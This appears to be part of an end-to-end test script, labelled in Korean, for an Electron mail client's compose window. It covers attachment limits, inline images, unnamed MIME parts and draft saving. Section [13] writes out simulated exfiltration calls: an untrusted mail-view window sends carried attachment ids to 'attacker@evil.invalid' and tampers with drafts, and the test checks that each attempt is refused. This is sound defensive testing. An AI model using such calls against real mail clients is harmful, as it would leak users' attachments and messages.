  const many = Array.from({ length: 25 }, (_, i) => fileOf(`f${String(i + 1).padStart(2, '0')}.pdf`, `F${i}`));
  r = composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: many });
  names = await waitChips(many.slice(0, 20).map((a) => a.filename));
  ok(Array.isArray(names) && names.length === 20, '25개 중 앞의 20개만 싣는다', Array.isArray(names) ? names.length : names);
  d = await data();
  ok(d.carryNote === '첨부 5개는 많아서 뺐습니다', '  알림: «첨부 5개는 많아서 뺐습니다»', d.carryNote);
  const n6 = sent.length;
  r = await sendMsg([{ carried: true, id: bId }]);
  ok(r && r.ok === false && sent.length === n6, '  닫힌 창에서 쓰던 id([5]의 b.pdf) → 새 창에서는 거절 (창을 닫으면 실어 둔 것을 버린다)', r);
  ok(await until(() => cjs(`document.getElementById('msg').textContent === '첨부 5개는 많아서 뺐습니다'
    && document.getElementById('msg').classList.contains('bad')`)), '  쓰기 창에 그 한 줄이 보인다');
  const MB = 1024 * 1024;
  const big = [
    { filename: 'a.bin', content: Buffer.alloc(8 * MB, 1) },
    { filename: 'b.bin', content: Buffer.alloc(15 * MB, 2) },
    { filename: 'c.bin', content: Buffer.alloc(5 * MB, 3) }
  ];
  r = composewin.startCompose({ kind: 'reply', accountId: ACC.id, source: src, files: big });
  names = await waitChips(['a.bin', 'c.bin']);
  ok(same(names, ['a.bin', 'c.bin']), '8MB·15MB·5MB → 20MB 안에 드는 a·c 만 (큰 b 때문에 뒤의 c 까지 버리지 않는다)', names);
  d = await data();
  ok(d.carryNote === '첨부 1개는 커서 뺐습니다 (b.bin)', '  알림: «첨부 1개는 커서 뺐습니다 (b.bin)»', d.carryNote);
  ok(await until(() => cjs(`document.getElementById('msg').textContent.startsWith('첨부 1개는 커서 뺐습니다')`)), '  쓰기 창에 보인다');
  ok(JSON.stringify(d).length < 100_000, '  13MB 를 실었어도 화면에 간 초안은 작다 (바이트 없음)', JSON.stringify(d).length);
  r = composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src,
    files: [{ filename: 'gone.pdf', contentType: 'application/pdf' }, fileOf('ok.pdf', 'OK-BYTES')] });
  names = await waitChips(['ok.pdf']);
  d = await data();
  ok(same(names, ['ok.pdf']) && d.carryNote === '첨부 1개는 못 실었습니다', '바이트가 없는 첨부는 빼되 말 없이 빼지 않는다', { names, note: d.carryNote });

  console.log('\n[7] 복사(다시 보내기)도 같은 길');
  r = composewin.startCopy({ accountId: ACC.id, view: { subject: '보낸 것', to: 'a@example.invalid', html: '<p>본문</p>' },
    files: [fileOf('copy.pdf', 'COPY-BYTES')] });
  names = await waitChips(['copy.pdf']);
  d = await data();
  ok(same(names, ['copy.pdf']) && d.title === '복사본' && keysOk(d.attachments) && /^copy\d+$/.test(d.attachments[0].id),
    '복사본 — 칩은 id 뿐', d.attachments);
  // 같은 그림이 본문에 두 번 (서명 로고처럼) — cid 그림 하나로 나가야 한다
  const LOGO = png('signature-logo');
  await cjs(`(() => { const s = 'data:image/png;base64,${LOGO.toString('base64')}';
    body.insertAdjacentHTML('beforeend', '<p><img src="' + s + '"> 로고 <img src="' + s + '"></p>'); })()`);
  const n7 = sent.length;
  await cjs(`document.getElementById('send').click()`);
  await until(() => sent.length > n7);
  p = sent.length > n7 ? await lastSent() : null;
  ins = p ? inlineParts(p).filter((a) => a.content.equals(LOGO)) : [];
  ok(p && ins.length === 1 && String(p.html).split(`cid:${ins[0].cid}`).length === 3 && same(regular(p).map((a) => a.filename), ['copy.pdf']),
    '  같은 그림 두 번 → cid 그림 하나를 두 번 가리킨다 (같은 바이트를 두 번 싣지 않는다)', p && inlineParts(p).map((a) => a.cid));
  ok(!!(await closedSoon()), '  보내고 나면 닫힌다');
  // 복사는 예전처럼 개수만 — 20MB 를 넘어도 보내기 한도(25MB) 안이면 그대로 싣는다
  const BIG22 = Buffer.alloc(22 * MB, 5);
  r = composewin.startCopy({ accountId: ACC.id, view: { subject: '큰 것', to: 'a@example.invalid', html: '<p>본문</p>' },
    files: [{ filename: 'big22.bin', contentType: 'application/octet-stream', content: BIG22 }] });
  names = await waitChips(['big22.bin']);
  d = await data();
  ok(same(names, ['big22.bin']) && !d.carryNote, '복사본 22MB — 빼지 않고 싣는다 (알림 없음)', { names, note: d.carryNote });
  const n7b = sent.length;
  r = await sendMsg(d.attachments);
  ok(r && r.ok && sent.length === n7b + 1 && sent[sent.length - 1].raw.length > 22 * MB, '  그대로 보내진다 (25MB 한도 안)', r && r.message);
  composeWin().close();
  await closedSoon();

  console.log('\n[8] 화면이 꾸린 원문으로는 답장·전달을 못 연다 (compose:open 은 새 메일만)');
  r = await handlers.get('compose:open')({}, { kind: 'forward', accountId: ACC.id, source: { subject: 'x', html: '<p>x</p>' } });
  ok(r && r.ok === false && !composeWin(), 'compose:open({ kind: forward }) → 거절, 창 안 열림', r);
  r = await handlers.get('mail:forward')({ sender: { id: -1 } });
  ok(r && r.ok === false && !composeWin(), '모르는 창에서 온 mail:forward → 거절', r);
  // 보낸메일함의 메일 — 단추·메뉴는 «답장»을 숨긴다. IPC로 바로 불러도 열지 않는다 (나에게 가는 답장)
  slots.set(-2, { payload: { ...payload, fromSelf: true }, files: view.attachments });
  r = await handlers.get('mail:reply')({ sender: { id: -2 } });
  ok(r && r.ok === false && /내가 보낸 메일/.test(r.message) && !composeWin(), '내가 보낸 메일에 mail:reply → 거절, 창 안 열림', r);

  console.log('\n[9] 소스 — 보기 창·preload·목록 메뉴가 이 길을 쓰는가');
  const viewSrc = fs.readFileSync(path.join(ROOT, 'renderer', 'mailview.html'), 'utf8');
  const preSrc = fs.readFileSync(path.join(SRC, 'preload.js'), 'utf8');
  const hubSrc = fs.readFileSync(path.join(SRC, 'mailhub.js'), 'utf8');
  ok(/window\.nunsseom\.mailReply\(\)/.test(viewSrc) && /window\.nunsseom\.mailForward\(\)/.test(viewSrc) && !/composeOpen/.test(viewSrc),
    'mailview.html — 답장·전달은 mailReply()·mailForward() (composeOpen 없음)');
  ok(/mailReply: \(\) => ipcRenderer\.invoke\('mail:reply'\)/.test(preSrc) && /mailForward: \(\) => ipcRenderer\.invoke\('mail:forward'\)/.test(preSrc),
    'preload — mailReply·mailForward 는 인자 없이 메인에 맡긴다');
  const draftFn = hubSrc.slice(hubSrc.indexOf('const draft = (kind)'), hubSrc.indexOf('const copy = ()'));
  const cwSrc = fs.readFileSync(path.join(SRC, 'composewin.js'), 'utf8');
  const viewFn = cwSrc.slice(cwSrc.indexOf('function composeFromView('), cwSrc.indexOf("ipcMain.handle('mail:reply'"));
  ok(/source: \{[^}]*\bcc: m\.cc,/.test(draftFn) && /source: \{[^}]*\bcc: v\.cc,/.test(viewFn),
    'mailhub 목록 메뉴 draft(kind)·보기 창 composeFromView — 원문의 참조(cc)를 startCompose 에 넘긴다');
  ok(/startCompose\(\{[\s\S]*files: mail\.realAttachmentsOf\(m\.attachments, m\.shown, \{ missed: m\.missed, twins: m\.twins \}\)/.test(draftFn)
    && /bodyPics: mail\.bodyPicsOf\(m\.attachments, m\.shown, \{ missed: m\.missed, twins: m\.twins \}\)/.test(draftFn),
  'mailhub 목록 메뉴 draft(kind) — startCompose 에 realAttachmentsOf·bodyPicsOf 를 싣는다');
  const composeJs = fs.readFileSync(path.join(ROOT, 'renderer', 'compose.js'), 'utf8');
  ok(/composeDropReplace: \(carryKey\) => ipcRenderer\.send\('compose:drop-replace', carryKey\)/.test(preSrc)
    && (composeJs.match(/\{ drop\(\); return; \}/g) || []).length === 3,
  'preload·쓰기 창 — 갈아끼우지 않은 초안(보내는 중·묻는 중·그만두기)은 메인에 알린다 (compose:drop-replace)');

  console.log('\n[10] 임시 저장·이어 쓰기 — 이름만 남고, 칩 id·바이트는 되살아나지 않는다');
  composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: listFiles });
  names = await waitChips(REAL_ATTS);
  const fwdIds = (await data()).attachments.map((a) => a.id);
  await cjs(`document.getElementById('subject').value = '이어 쓸 글'; saveDraftNow()`);
  const md = await until(() => store.mailDraft && store.mailDraft.subject === '이어 쓸 글' && store.mailDraft);
  ok(md && same(Object.keys(md).sort(), ['accountId', 'at', 'attachNames', 'bcc', 'bodyHtml', 'carriedNames', 'cc',
    'inReplyTo', 'kind', 'references', 'subject', 'title', 'to'])
    && same(md.carriedNames, REAL_ATTS) && same(md.attachNames, []),
  '임시 저장 — 원문 첨부는 이름(carriedNames)만, id·바이트 칸은 없다', md && { keys: Object.keys(md), carried: md.carriedNames });
  ok(md && !MARKERS.test(flat(md)) && !fwdIds.some((id) => JSON.stringify(md).includes(`"${id}"`)), '  저장된 초안에 첨부 바이트도 칩 id 도 없다');
  composeWin().close();
  await closedSoon();
  r = composewin.startCompose({ kind: 'new', accountId: ACC.id });
  names = await waitChips([]);
  d = await data();
  ok(r && r.ok && same(names, []) && same(d.attachments, []) && d.restored && d.subject === '이어 쓸 글',
    '이어 쓰기 — 글은 돌아오고 원문 첨부 칩은 없다', { names, subject: d.subject });
  const note10 = await until(() => cjs(`document.getElementById('msg').textContent`).then((t) => (t.includes('원문 첨부') ? t : null)));
  ok(note10 && note10.includes('원문 첨부 3개는 메일에서 다시 답장·전달해야 붙습니다') && !note10.includes('다시 붙여주세요'),
    '  알림 — 디스크에 없는 원문 첨부는 «다시 붙여주세요»가 아니라 메일에서 다시 답장·전달하라고', note10);
  const n10 = sent.length;
  r = await sendMsg([{ carried: true, id: fwdIds[0] }]);
  ok(r && r.ok === false && sent.length === n10, '  닫기 전의 칩 id 로는 못 보낸다', r);
  composeWin().close();
  await closedSoon();
  store.clearMailDraft();

  console.log('\n[11] 이름 없는 첨부 — 보기 창의 «첨부N» 그대로 싣고, 원문 형식대로 나간다');
  const OCT = Buffer.from('octet-marker-OCT\x00\x01\x02');
  const INNER = 'From: <inner@example.invalid>\r\nSubject: inner\r\nMIME-Version: 1.0\r\n'
    + 'Content-Type: text/plain; charset=utf-8\r\n\r\ninner-marker-MSG\r\n';
  const ICS = 'BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nUID:cal-marker-ICS@example.invalid\r\n'
    + 'SUMMARY:meeting\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n';
  const HWP = Buffer.from('HWP Document File hwp-marker-HWP');
  const head = (subject, id) => ['From: "보낸이" <sender@example.invalid>', 'To: <me@example.invalid>', `Subject: ${subject}`,
    `Message-ID: <${id}@example.invalid>`, 'Date: Tue, 20 Oct 2026 13:13:00 +0900', 'MIME-Version: 1.0'];
  const EML2 = [
    ...head('noname', 'orig-2'),
    'Content-Type: multipart/mixed; boundary="MIX2"', '',
    '--MIX2', 'Content-Type: text/html; charset="utf-8"', '', '<p>이름 없는 첨부</p>',
    // 이름 없는 octet-stream · Outlook «첨부로 전달»(message/rfc822) · 회의 초대(text/calendar) · 모르는 확장자
    '--MIX2', 'Content-Type: application/octet-stream', 'Content-Disposition: attachment', 'Content-Transfer-Encoding: base64', '', b64(OCT),
    '--MIX2', 'Content-Type: message/rfc822', '', INNER,
    '--MIX2', 'Content-Type: text/calendar; method=REQUEST; charset="utf-8"', 'Content-Transfer-Encoding: 7bit', '', ICS,
    '--MIX2', 'Content-Type: application/x-hwp; name="report.hwp"', 'Content-Disposition: attachment; filename="report.hwp"',
    'Content-Transfer-Encoding: base64', '', b64(HWP),
    '--MIX2--', ''
  ].join('\r\n');
  const view2 = await mail.viewFromSource(Buffer.from(EML2), { allowRemote: false });
  const payload2 = mail.viewPayload(view2, { accountId: ACC.id, fromSelf: false, seen: true });
  const NONAME = ['첨부1', '첨부2.eml', '첨부3.ics', 'report.hwp'];
  const names2 = payload2.attachments.filter((a) => !a.inline).map((a) => a.filename);
  ok(same(names2, NONAME) && view2.attachments.slice(0, 3).every((a) => !a.filename),
    '보기 창 «첨부» = 첨부1 · 첨부2.eml · 첨부3.ics · report.hwp (앞의 셋은 원문에 이름이 없다)', names2);
  slots.set(-3, { payload: payload2, files: view2.attachments });
  r = await handlers.get('mail:forward')({ sender: { id: -3 } });
  names = await waitChips(NONAME);
  d = await data();
  ok(r && r.ok && same(names, NONAME) && !d.carryNote, '보기 창 «전달» — 이름 없는 것도 그 이름으로 칩이 된다 (빠진 것 없음)', { names, note: d && d.carryNote });
  await cjs(`document.getElementById('to').value = 'friend@example.invalid'; document.getElementById('send').click()`);
  const n11 = sent.length;
  await until(() => sent.length > n11);
  p = sent.length > n11 ? await lastSent() : null;
  regs = p ? regular(p) : [];
  ok(same(regs.map((a) => a.filename), NONAME), '  나간 첨부 = 보기 창의 넷', regs.map((a) => a.filename));
  ok(regs.length === 4 && regs[0].content.equals(OCT) && regs[1].content.toString().includes('inner-marker-MSG')
    && regs[2].content.toString().includes('cal-marker-ICS') && regs[3].content.equals(HWP), '  바이트 그대로');
  ok(same(regs.map((a) => a.contentType), ['application/octet-stream', 'message/rfc822', 'text/calendar', 'application/x-hwp']),
    '  형식도 원문 그대로 (.hwp 가 octet-stream 이 되지 않고, 첨부된 메일도 첨부로 나간다)', regs.map((a) => [a.contentType, a.contentDisposition]));
  ok(!!(await closedSoon()), '  보내고 나면 닫힌다');
  const list2 = mail.realAttachmentsOf(view2.attachments, view2.shown, { missed: view2.missed, twins: view2.twins });
  r = composewin.startCompose({ kind: 'reply', accountId: ACC.id, files: list2,
    source: { subject: view2.subject, from: view2.from, fromAddress: view2.fromAddress, messageId: view2.messageId, html: view2.html } });
  names = await waitChips(NONAME);
  ok(same(names, NONAME), '목록 메뉴 «답장» 길(realAttachmentsOf)도 같은 넷', names);
  composeWin().close();
  await closedSoon();

  console.log('\n[12] 본문 그림이 커서 인용문에서 덜어내면 — 첨부로 싣는다 (인용문에도 첨부에도 없는 일이 없게)');
  const SHOT = Buffer.concat([PNG, Buffer.alloc(350 * 1024, 7)]);   // 화면 캡처 한 장 (350KB)
  const SMALL = png('small-in-body');
  const R3 = Buffer.from('%PDF-1.4\n% r3-marker\n%%EOF\n');
  const EML3 = [
    ...head('capture', 'orig-3'),
    'Content-Type: multipart/mixed; boundary="MIX3"', '',
    '--MIX3', 'Content-Type: multipart/related; boundary="REL3"; type="text/html"', '',
    '--REL3', 'Content-Type: text/html; charset="utf-8"', '',
    '<p>화면 캡처입니다</p><p><img src="cid:shot@x"></p><p><img src="cid:small@x"></p>',
    '--REL3', 'Content-Type: image/png; name="shot.png"', 'Content-ID: <shot@x>', 'Content-Transfer-Encoding: base64', '', b64(SHOT),
    '--REL3', 'Content-Type: image/png; name="small.png"', 'Content-ID: <small@x>', 'Content-Transfer-Encoding: base64', '', b64(SMALL),
    '--REL3--', '',
    '--MIX3', 'Content-Type: application/pdf; name="r.pdf"', 'Content-Disposition: attachment; filename="r.pdf"',
    'Content-Transfer-Encoding: base64', '', b64(R3),
    '--MIX3--', ''
  ].join('\r\n');
  const view3 = await mail.viewFromSource(Buffer.from(EML3), { allowRemote: false });
  const payload3 = mail.viewPayload(view3, { accountId: ACC.id, fromSelf: false, seen: true });
  ok(same(payload3.attachments.filter((a) => a.inline).map((a) => a.filename), ['shot.png', 'small.png'])
    && same(payload3.attachments.filter((a) => !a.inline).map((a) => a.filename), ['r.pdf']),
  '보기 창 — shot.png·small.png 는 본문 그림, r.pdf 는 첨부');
  const sendMod = require(path.join(SRC, 'send.js'));
  ok(sendMod.draftFrom('forward', { html: view3.html }).quoteDropped === 2 && !sendMod.draftFrom('forward', { html: view.html }).quoteDropped,
    '  인용문이 너무 커서 그림 둘을 덜어낸다 (작은 메일은 안 덜어낸다)');
  slots.set(-4, { payload: payload3, files: view3.attachments });
  const PICS = ['r.pdf', 'shot.png', 'small.png'];
  r = await handlers.get('mail:forward')({ sender: { id: -4 } });
  names = await waitChips(PICS);
  d = await data();
  ok(r && r.ok && same(names, PICS) && d.carryNote === '본문 그림 2개는 첨부로 붙였습니다',
    '보기 창 «전달» — 덜어낸 본문 그림은 첨부 칩으로, 쓰기 창에 한 줄로', { names, note: d && d.carryNote });
  ok(await until(() => cjs(`document.getElementById('msg').textContent === '본문 그림 2개는 첨부로 붙였습니다'`)), '  쓰기 창에 그 한 줄이 보인다');
  await cjs(`document.getElementById('to').value = 'friend@example.invalid'; document.getElementById('send').click()`);
  const n12 = sent.length;
  await until(() => sent.length > n12);
  p = sent.length > n12 ? await lastSent() : null;
  const hits = (buf) => (p ? p.attachments.filter((a) => a.content.equals(buf)).length : -1);
  ok(p && hits(SHOT) === 1 && hits(SMALL) === 1 && hits(R3) === 1 && !/data:/i.test(String(p.html)),
    '  나간 메일에 그림 바이트가 꼭 한 번씩 (첨부로) — data: 그림 없음', p && p.attachments.map((a) => [a.filename, a.contentDisposition, a.size]));
  ok(!!(await closedSoon()), '  보내고 나면 닫힌다');
  r = composewin.startCompose({ kind: 'forward', accountId: ACC.id,
    source: { subject: view3.subject, from: view3.from, fromAddress: view3.fromAddress, html: view3.html },
    files: mail.realAttachmentsOf(view3.attachments, view3.shown, { missed: view3.missed, twins: view3.twins }),
    bodyPics: mail.bodyPicsOf(view3.attachments, view3.shown, { missed: view3.missed, twins: view3.twins }) });
  names = await waitChips(PICS);
  ok(same(names, PICS), '목록 메뉴 «전달» 길(bodyPicsOf)도 같다', names);
  composeWin().close();
  await closedSoon();

  console.log('\n[13] 메일 보기 창(남의 HTML)이 쓰기 창의 문을 두드려도 — 거절');
  composewin.startCompose({ kind: 'forward', accountId: ACC.id, source: src, files: listFiles });
  names = await waitChips(REAL_ATTS);
  d = await data();
  const fIds = d.attachments.map((a) => a.id);
  const n13 = sent.length;
  ok(await vjs('window.nunsseom.composeData()') === null, '보기 창의 composeData() → null (칩 id 를 못 읽는다)');
  r = await vjs(`window.nunsseom.composeSend({ to: 'attacker@evil.invalid', subject: 'x', text: 'x',
    attachments: ${JSON.stringify(fIds.map((id) => ({ carried: true, id })))} })`);
  ok(r && r.ok === false && sent.length === n13, '보기 창의 composeSend(원문 칩 id) → 거절, 아무것도 안 나간다', r);
  await vjs(`window.nunsseom.composeAcceptReplace({ accountId: ${JSON.stringify(ACC.id)} });
    window.nunsseom.composeSetAccount(${JSON.stringify(ACC.id)});
    window.nunsseom.composeDraftSave({ subject: 'evil' });
    window.nunsseom.composeDropReplace(1); true`);
  await sleep(250);
  d = await data();
  ok(d && d.title === '전달' && same(d.attachments.map((a) => a.id), fIds) && !store.mailDraft,
    '  보기 창의 갈아끼기·계정 바꾸기·임시 저장 → 무시 (초안·칩 그대로, 임시 저장 없음)', d && { title: d.title, draft: store.mailDraft });
  r = await sendMsg(d.attachments);
  ok(r && r.ok && sent.length === n13 + 1, '  쓰기 창에서는 그대로 보낸다', r);
  composeWin().close();
  await closedSoon();
  // 쓰기 창이 아예 없을 때도 — 예전엔 보기 창이 수락을 지어낸 뒤 보내면 사용자 계정으로 나갔다
  await vjs(`window.nunsseom.composeAcceptReplace({ accountId: ${JSON.stringify(ACC.id)} }); true`);
  await sleep(100);
  r = await vjs(`window.nunsseom.composeSend({ to: 'attacker@evil.invalid', subject: 'x', text: 'x', attachments: [] })`);
  ok(r && r.ok === false && sent.length === n13 + 1, '쓰기 창이 없을 때 보기 창의 composeSend → 거절', r);

  viewWin.destroy();
  console.log(bad ? `\n${bad}개 실패` : '\n모두 통과');
  process.exit(bad ? 1 : 0);
}).catch((e) => { console.error('시험 터짐:', (e && e.stack) || e); process.exit(1); });
